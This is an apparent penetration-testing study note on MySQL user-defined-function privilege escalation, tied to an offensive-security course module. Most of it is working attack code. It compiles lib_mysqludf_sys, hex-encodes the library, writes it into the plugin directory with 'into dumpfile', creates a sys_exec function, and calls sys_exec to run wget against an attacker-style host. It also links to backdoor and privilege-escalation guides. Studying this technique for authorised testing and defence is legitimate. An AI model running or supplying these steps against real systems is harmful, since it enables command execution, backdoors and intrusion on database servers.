
```
gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so 
```

```
git clone https://github.com/mysqludf/lib_mysqludf_sys.git
cd lib_mysqludf_sys/
sudo apt update && sudo apt install default-libmysqlclient-dev
rm lib_mysqludf_sys.so
xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex
mysql --host=127.0.0.1 --port=13306 --user=root -p
```

> [!info] 
> Check module for the steps of [compiling mysqludf](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/assembling-the-pieces-penetration-test-breakdown/targeting-the-database/attempting-to-exploit-the-database) 

```
set @shell = 0x7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000e03b0000000000000000000040003800090040001c001b000100000004000000000000...00000000000000000000;

select binary @shell into dumpfile /home/dev/plugin/udf_sys_exec.so';

create function sys_exec returns int soname 'udf_sys_exec.so';

select * from mysql.func where name='sys_exec';

select sys_exec('wget http://10.11.0.4');
```


**Resources**
```
https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf

https://tesserent.com/insights/blog/simple-mysql-backdoor-using-user-defined-functions
```